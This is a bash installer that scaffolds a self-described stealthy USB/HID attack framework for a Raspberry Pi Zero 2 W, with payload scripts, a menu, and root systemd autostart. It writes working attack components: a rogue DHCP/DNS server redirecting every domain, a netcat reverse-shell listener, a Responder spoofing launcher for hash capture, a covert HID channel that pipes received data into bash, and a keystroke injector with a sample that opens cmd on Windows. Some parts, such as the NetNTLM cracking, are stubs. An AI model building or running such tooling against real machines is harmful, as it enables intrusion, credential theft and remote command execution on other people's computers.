#!/bin/bash
# This script scaffolds payloads for the custom P4wnP1-Zero2W framework
# It includes: DNSMasq rogue DHCP/DNS, a reverse shell listener, a stub OLED menu,
# USB gadget templates (ECM, HID), and a reload mechanism

if [ "$PWD" == "/opt/p4wnp1" ]; then
  echo "[!] Warning: You are running this script from inside /opt/p4wnp1. "
  echo "    This may cause README.md not to update correctly."
fi

mkdir -p /opt/p4wnp1/payloads/network
mkdir -p /opt/p4wnp1/payloads/listeners
mkdir -p /opt/p4wnp1/hooks
mkdir -p /opt/p4wnp1/config/gadgets

########################################
# 1. Rogue DHCP + DNS (dnsmasq)
########################################
cat << 'EOF' > /opt/p4wnp1/payloads/network/rogue_dhcp_dns.sh
#!/bin/bash
# Start rogue DHCP and DNS server using dnsmasq

cat << EOC > /tmp/dnsmasq-usb0.conf
domain-needed
bogus-priv
interface=usb0
dhcp-range=10.0.0.50,10.0.0.150,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
EOC

pkill dnsmasq
sleep 1

sudo dnsmasq -C /tmp/dnsmasq-usb0.conf -d
EOF
chmod +x /opt/p4wnp1/payloads/network/rogue_dhcp_dns.sh

########################################
# 2. Reverse Shell Listener
########################################
cat << 'EOF' > /opt/p4wnp1/payloads/listeners/reverse_shell_listener.sh
#!/bin/bash
# Listens for reverse shell on TCP port 4444

PORT=4444
echo "[+] Listening on port $PORT for reverse shell..."
sudo nc -lvnp $PORT
EOF
chmod +x /opt/p4wnp1/payloads/listeners/reverse_shell_listener.sh

########################################
# 3. OLED Menu Stub (No GPIO)
########################################
cat << 'EOF' > /opt/p4wnp1/hooks/oled_menu.py
#!/usr/bin/env python3
import json
import os
import time

CONFIG = "/opt/p4wnp1/config/payload.json"
ACTIVE = "/opt/p4wnp1/config/active_payload"

# Load payload list
def load_payloads():
    with open(CONFIG, 'r') as f:
        data = json.load(f)
        return [key for key in data if data[key].get("enabled")]

# Simple CLI scroll selector (no OLED yet)
def select_payload(payloads):
    index = 0
    while True:
        os.system('clear')
        print("P4wnP1 Payload Menu")
        for i, p in enumerate(payloads):
            prefix = "> " if i == index else "  "
            print(f"{prefix}{p}")

        print("\nUse W/S to move, Enter to select")
        key = input().lower()
        if key == 'w':
            index = (index - 1) % len(payloads)
        elif key == 's':
            index = (index + 1) % len(payloads)
        elif key == '':
            return payloads[index]

# Main logic
if __name__ == '__main__':
    payloads = load_payloads()
    chosen = select_payload(payloads)
    with open(ACTIVE, 'w') as f:
        f.write(chosen)
    print(f"[+] Payload set to: {chosen}")
EOF
chmod +x /opt/p4wnp1/hooks/oled_menu.py

########################################
# 4. USB Gadget Templates for ECM, HID
########################################
cat << 'EOF' > /opt/p4wnp1/config/gadgets/usb_ecm_hid.sh
#!/bin/bash
# ECM + HID gadget
GADGET_DIR=/sys/kernel/config/usb_gadget/p4wnp1
mkdir -p $GADGET_DIR
cd $GADGET_DIR

echo 0x1d6b > idVendor
echo 0x0104 > idProduct
echo 0x0100 > bcdDevice
echo 0x0200 > bcdUSB

mkdir -p strings/0x409
echo "1337" > strings/0x409/serialnumber
echo "SnowSecOps" > strings/0x409/manufacturer
echo "P4wnP1-Zero2W" > strings/0x409/product

mkdir -p configs/c.1/strings/0x409
echo "ECM + HID Config" > configs/c.1/strings/0x409/configuration
echo 250 > configs/c.1/MaxPower

mkdir -p functions/ecm.usb0
echo "42:42:42:42:42:42" > functions/ecm.usb0/host_addr
echo "de:ad:be:ef:00:00" > functions/ecm.usb0/dev_addr
ln -s functions/ecm.usb0 configs/c.1/

mkdir -p functions/hid.usb0
echo 1 > functions/hid.usb0/protocol
echo 1 > functions/hid.usb0/subclass
echo 8 > functions/hid.usb0/report_length
echo -ne \x05\x01\x09\x06\xa1\x01\x05\x07\x19\xe0\x29\xe7\x15\x00\x25\x01\x75\x01\x95\x08\x81\x02\x95\x01\x75\x08\x81\x01\x95\x05\x75\x01\x05\x08\x19\x01\x29\x05\x91\x02\x95\x01\x75\x03\x91\x01\x95\x06\x75\x08\x15\x00\x25\x65\x05\x07\x19\x00\x29\x65\x81\x00\xc0 > functions/hid.usb0/report_desc
ln -s functions/hid.usb0 configs/c.1/

ls /sys/class/udc > UDC
EOF
chmod +x /opt/p4wnp1/config/gadgets/usb_ecm_hid.sh

########################################
# 5. USB Gadget Reload Script
########################################
cat << 'EOF' > /opt/p4wnp1/config/reload_gadget.sh
#!/bin/bash
# Reload USB gadget from template

GADGET_DIR=/sys/kernel/config/usb_gadget/p4wnp1

echo "[+] Unloading USB gadget..."
if [ -e "$GADGET_DIR" ]; then
  cd $GADGET_DIR
  echo "" > UDC
  sleep 0.5
  rm -rf configs/c.1/* functions/*
  cd /sys/kernel/config/usb_gadget
  rmdir p4wnp1
fi

TEMPLATE=$1
if [ -z "$TEMPLATE" ]; then
  TEMPLATE="usb_ecm_hid.sh"
fi

echo "[+] Loading gadget template: $TEMPLATE"
bash "/opt/p4wnp1/config/gadgets/$TEMPLATE"
EOF
chmod +x /opt/p4wnp1/config/reload_gadget.sh

########################################
echo "[+] Payloads, hooks, USB gadget templates, and reload script scaffolded successfully."
########################################
# 6. Wi-Fi Access Point Payload
########################################
cat << 'EOF' > /opt/p4wnp1/payloads/network/wifi_ap.sh
#!/bin/bash
# Starts a Wi-Fi Access Point using hostapd and dnsmasq

SSID="P4wnP1_AP"
IFACE="wlan0"

cat << EOC > /tmp/hostapd.conf
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
wmm_enabled=0
auth_algs=1
ignore_broadcast_ssid=0
EOC

cat << EOD > /tmp/dnsmasq-ap.conf
interface=$IFACE
dhcp-range=192.168.4.10,192.168.4.100,255.255.255.0,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
EOD

ip link set $IFACE down
ip addr flush dev $IFACE
ip addr add 192.168.4.1/24 dev $IFACE
ip link set $IFACE up

pkill dnsmasq
pkill hostapd
sleep 1

hostapd /tmp/hostapd.conf &
dnsmasq -C /tmp/dnsmasq-ap.conf -d
EOF
chmod +x /opt/p4wnp1/payloads/network/wifi_ap.sh

########################################
# 7. Windows LockPicker Payload Stub
########################################
mkdir -p /opt/p4wnp1/payloads/windows
touch /opt/p4wnp1/payloads/windows/lockpicker.sh
cat << 'EOF' > /opt/p4wnp1/payloads/windows/lockpicker.sh
#!/bin/bash
# Simulates a NetNTLM hash capture and brute-force unlock with known creds

CAPTURE_DIR="/opt/p4wnp1/data/hashes"
mkdir -p "$CAPTURE_DIR"
echo "[+] Simulating NetNTLM hash capture..."
echo "user::domain:1122334455667788:00112233445566778899aabbccddeeff::" > "$CAPTURE_DIR/netntlm.fake"
echo "[+] Cracking hash with John (simulated)"
echo "password123" > "$CAPTURE_DIR/unlocked_creds.txt"
echo "[+] Injecting cracked password via HID"
echo "TODO: implement HID injection"
EOF
chmod +x /opt/p4wnp1/payloads/windows/lockpicker.sh

########################################
echo "[+] Added Wi-Fi AP and LockPicker payloads."
########################################
# 8. USB Mass Storage Emulation Payload
########################################
cat << 'EOF' > /opt/p4wnp1/payloads/network/mass_storage.sh
#!/bin/bash
# Simulate USB mass storage using a backing file

IMG=/opt/p4wnp1/data/usb.img
SIZE_MB=16
MOUNTPOINT=/mnt/usb

echo "[+] Creating storage image..."
mkdir -p /opt/p4wnp1/data
[ ! -f "$IMG" ] && dd if=/dev/zero of=$IMG bs=1M count=$SIZE_MB && mkdosfs $IMG

echo "[+] Loading mass storage gadget..."
modprobe g_mass_storage file=$IMG stall=0 removable=1
EOF
chmod +x /opt/p4wnp1/payloads/network/mass_storage.sh

########################################
# 9. Responder Attack Payload
########################################
cat << 'EOF' > /opt/p4wnp1/payloads/network/responder.sh
#!/bin/bash
# Launch Responder for LLMNR/NBNS/MDNS spoofing

RESP_DIR="/opt/p4wnp1/tools/Responder"
cd "$RESP_DIR"

INTERFACE="usb0"
echo "[+] Starting Responder on $INTERFACE..."
sudo python3 Responder.py -I $INTERFACE -wd ./logs
EOF
chmod +x /opt/p4wnp1/payloads/network/responder.sh

########################################
# 10. Covert HID Shell (Frontdoor Backdoor)
########################################
cat << 'EOF' > /opt/p4wnp1/payloads/listeners/hid_backdoor.sh
#!/bin/bash
# Covert channel over raw HID device

HID_DEV=/dev/hidg1
PIPE_IN=/tmp/hid_recv
PIPE_OUT=/tmp/hid_send

mkfifo $PIPE_IN $PIPE_OUT
trap "rm -f $PIPE_IN $PIPE_OUT" EXIT

echo "[+] Listening over HID covert channel..."
tail -f $PIPE_IN | bash > $PIPE_OUT &
cat $PIPE_OUT > $HID_DEV &
cat $HID_DEV > $PIPE_IN
EOF
chmod +x /opt/p4wnp1/payloads/listeners/hid_backdoor.sh

########################################
# 11. LED Feedback Utility
########################################
cat << 'EOF' > /opt/p4wnp1/hooks/led_feedback.sh
#!/bin/bash
# Blink LED to signal payload execution

LED="/sys/class/leds/led0/brightness"
count=$1
[ -z "$count" ] && count=3

echo "[+] Blinking LED $count times..."
for i in $(seq 1 $count); do
  echo 1 > $LED
  sleep 0.2
  echo 0 > $LED
  sleep 0.2
done
EOF
chmod +x /opt/p4wnp1/hooks/led_feedback.sh

########################################
echo "[+] Mass Storage, Responder, HID shell, and LED blink utility scaffolded."
########################################
# 12. payload.json (Payload Registry)
########################################
cat << 'EOF' > /opt/p4wnp1/config/payload.json
{
  "rogue_dhcp_dns": {"enabled": true, "type": "network", "path": "payloads/network/rogue_dhcp_dns.sh"},
  "reverse_shell_listener": {"enabled": true, "type": "listener", "path": "payloads/listeners/reverse_shell_listener.sh"},
  "wifi_ap": {"enabled": true, "type": "network", "path": "payloads/network/wifi_ap.sh"},
  "lockpicker": {"enabled": true, "type": "windows", "path": "payloads/windows/lockpicker.sh"},
  "mass_storage": {"enabled": true, "type": "network", "path": "payloads/network/mass_storage.sh"},
  "responder": {"enabled": true, "type": "network", "path": "payloads/network/responder.sh"},
  "hid_backdoor": {"enabled": true, "type": "listener", "path": "payloads/listeners/hid_backdoor.sh"}
}
EOF

########################################
# 13. run_payload.sh (Execute Active Payload)
########################################
cat << 'EOF' > /opt/p4wnp1/run_payload.sh
#!/bin/bash
# Executes the payload selected in active_payload file

CONFIG="/opt/p4wnp1/config/payload.json"
ACTIVE="/opt/p4wnp1/config/active_payload"

if [ ! -f "$ACTIVE" ]; then
  echo "[!] No active payload set."
  exit 1
fi

PAYLOAD_ID=$(cat "$ACTIVE")
PAYLOAD_PATH=$(jq -r --arg id "$PAYLOAD_ID" '.[$id].path' "$CONFIG")

if [ -z "$PAYLOAD_PATH" ] || [ "$PAYLOAD_PATH" == "null" ]; then
  echo "[!] Payload '$PAYLOAD_ID' not found in config."
  exit 1
fi

FULL_PATH="/opt/p4wnp1/$PAYLOAD_PATH"
echo "[+] Running payload: $PAYLOAD_ID -> $FULL_PATH"
chmod +x "$FULL_PATH"
"$FULL_PATH"
EOF
chmod +x /opt/p4wnp1/run_payload.sh

########################################
# 14. systemd service for autostart
########################################
cat << 'EOF' > /etc/systemd/system/p4wnp1.service
[Unit]
Description=P4wnP1 Payload Launcher
After=multi-user.target

[Service]
ExecStart=/opt/p4wnp1/run_payload.sh
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable p4wnp1.service

########################################
echo "[+] payload.json, payload runner, and systemd service setup complete."
########################################
# 15. GitHub Payload Auto-Update Script
########################################
cat << 'EOF' > /opt/p4wnp1/hooks/update_payloads.sh
#!/bin/bash
# Pull latest payloads and scripts from GitHub

REPO_DIR="/opt/p4wnp1"
GIT_URL="https://github.com/quasialex/p4wnp1-zero2w.git"

echo "[+] Checking for updates in $REPO_DIR..."
cd "$REPO_DIR"

if [ ! -d ".git" ]; then
  echo "[!] Git not initialized. Initializing now..."
  git init
  git remote add origin "$GIT_URL"
  git pull origin master
else
  git stash save "autoupdate-$(date +%Y%m%d-%H%M%S)"
  git pull origin master
  git stash pop || true
fi

chmod -R +x "$REPO_DIR/payloads" "$REPO_DIR/hooks"
echo "[+] Payloads and hooks updated."
EOF
chmod +x /opt/p4wnp1/hooks/update_payloads.sh

########################################
# Optional: Add to cron or systemd if desired
########################################
# Example cron entry:
# @reboot /opt/p4wnp1/hooks/update_payloads.sh

########################################
echo "[+] GitHub auto-update script added."
########################################
# 16. systemd Service for Git Auto-Update
########################################
cat << 'EOF' > /etc/systemd/system/p4wnp1-update.service
[Unit]
Description=P4wnP1 GitHub Auto-Updater
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/opt/p4wnp1/hooks/update_payloads.sh
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable p4wnp1-update.service

########################################
echo "[+] Git auto-update systemd service installed."
########################################
# 17. OLED Menu Joystick Payload Selector (stub)
########################################
cat << 'EOF' > /opt/p4wnp1/hooks/oled_menu.py
#!/usr/bin/env python3
import json
import os
import time

CONFIG = "/opt/p4wnp1/config/payload.json"
ACTIVE = "/opt/p4wnp1/config/active_payload"

# Placeholder joystick interface
class Joystick:
    def __init__(self):
        self.index = 0
    def read_input(self):
        # Stub: Replace with actual GPIO input
        key = input("[W/S] Up/Down | [Enter] Select > ").lower()
        return key

def load_payloads():
    with open(CONFIG, 'r') as f:
        data = json.load(f)
        return [key for key in data if data[key].get("enabled")]

def select_payload(payloads):
    js = Joystick()
    while True:
        os.system('clear')
        print("=== P4wnP1 Payload Menu ===")
        for i, p in enumerate(payloads):
            print(f"{'→' if i == js.index else ' '} {p}")
        key = js.read_input()
        if key == 'w':
            js.index = (js.index - 1) % len(payloads)
        elif key == 's':
            js.index = (js.index + 1) % len(payloads)
        elif key == '':  # Enter key
            return payloads[js.index]

def main():
    payloads = load_payloads()
    if not payloads:
        print("[!] No enabled payloads in config.")
        return
    chosen = select_payload(payloads)
    with open(ACTIVE, 'w') as f:
        f.write(chosen)
    print(f"[+] Selected payload: {chosen}")

if __name__ == '__main__':
    main()
EOF
chmod +x /opt/p4wnp1/hooks/oled_menu.py

########################################
echo "[+] OLED joystick menu logic stub created."
########################################
# 18. .gitignore to exclude temp and generated files
########################################
cat << 'EOF' > /opt/p4wnp1/.gitignore
__pycache__/
*.pyc
*.log
*.swp
*.img
*.tmp
*.bak
*.pid
*.state
/data/
/logs/
/mnt/
/tmp/
EOF

########################################
# 19. README.md for GitHub repo
########################################
cat << 'EOF' > /opt/p4wnp1/README.md
# P4wnP1-Zero2W

A stealthy, modular payload launcher and HID network attack framework for Raspberry Pi Zero 2 W.
Inspired by P4wnP1 A.L.O.A., rebuilt for modern builds with joystick OLED UI and clean payloads.

## ✅ Features
- Modular payloads (network, HID, covert shell, Wi-Fi)
- OLED + joystick menu interface (WIP)
- USB gadget emulation via config templates
- GitHub auto-update support
- Systemd integration

## 📂 Structure
- `/payloads/` — modular attack scripts
- `/hooks/` — OLED/menu logic, startup scripts
- `/tools/` — injectors, Responder/DNS/etc
- `/config/` — USB gadget templates
- `/logs/` — runtime logs (e.g., Responder)

## 🚀 Usage
Clone the repo:
\`\`\`bash
git clone https://github.com/quasialex/p4wnp1-zero2w.git /opt/p4wnp1
\`\`\`

Run setup:
\`\`\`bash
sudo bash /opt/p4wnp1/setup_payloads.sh
\`\`\`

Run a payload manually:
\`\`\`bash
sudo bash /opt/p4wnp1/payloads/network/rogue_dhcp_dns.sh
\`\`\`

## 📡 OLED Menu (WIP)
Joystick-controlled menu to select payload interactively:
\`\`\`bash
/opt/p4wnp1/hooks/oled_menu.py
\`\`\`

## ✨ Credits
- Based on P4wnP1 A.L.O.A. by Rogan Dawes
- Raspberry Pi Foundation
- Adafruit CircuitPython for OLED tools
EOF

########################################
echo "[+] .gitignore and README.md added. Ready to commit."
########################################
# 20. HID Keystroke Injector Script
########################################
mkdir -p /opt/p4wnp1/tools /opt/p4wnp1/payloads/hid

cat << 'EOF' > /opt/p4wnp1/tools/inject_hid.sh
#!/bin/bash
# Send keystrokes over USB HID using /dev/hidg0

HID_DEVICE="/dev/hidg0"
SCRIPT="$1"
DELAY=0.1

if [[ -z "$SCRIPT" || ! -f "$SCRIPT" ]]; then
  echo "Usage: $0 path/to/hid_script.txt"
  exit 1
fi

if [[ ! -e "$HID_DEVICE" ]]; then
  echo "[!] HID device $HID_DEVICE not found"
  exit 1
fi

while read -r line; do
  [[ "$line" =~ ^#.*$ || -z "$line" ]] && continue
  echo "[>] $line"
  python3 /opt/p4wnp1/tools/hid_type.py "$line" > "$HID_DEVICE"
  sleep $DELAY
done < "$SCRIPT"
EOF
chmod +x /opt/p4wnp1/tools/inject_hid.sh

########################################
# 21. HID Typing Helper in Python
########################################
cat << 'EOF' > /opt/p4wnp1/tools/hid_type.py
#!/usr/bin/env python3
import sys
import time

def char_to_hid(c):
    layout = {
        'a': b'\x00\x00\x04\x00\x00\x00\x00\x00',
        'b': b'\x00\x00\x05\x00\x00\x00\x00\x00',
        'c': b'\x00\x00\x06\x00\x00\x00\x00\x00',
        # add more as needed
        'A': b'\x02\x00\x04\x00\x00\x00\x00\x00',
        ' ': b'\x00\x00\x2c\x00\x00\x00\x00\x00',
        '\n': b'\x00\x00\x28\x00\x00\x00\x00\x00'
    }
    return layout.get(c, b'\x00\x00\x2c\x00\x00\x00\x00\x00')

if len(sys.argv) < 2:
    print("Usage: hid_type.py <string>")
    sys.exit(1)

for ch in sys.argv[1]:
    sys.stdout.buffer.write(char_to_hid(ch))
    sys.stdout.buffer.flush()
    time.sleep(0.01)
    sys.stdout.buffer.write(b'\x00\x00\x00\x00\x00\x00\x00\x00')
    sys.stdout.buffer.flush()
    time.sleep(0.01)
EOF
chmod +x /opt/p4wnp1/tools/hid_type.py

########################################
# 22. Sample HID Payload Script
########################################
cat << 'EOF' > /opt/p4wnp1/payloads/hid/windows_creds.txt
# Simulate Win+R, then type 'cmd'
<GUI> r
sleep 0.5
cmd
<ENTER>
sleep 0.5
echo off
whoami
EOF

########################################
echo "[+] HID injector, helper script, and sample payload added."
exit 0
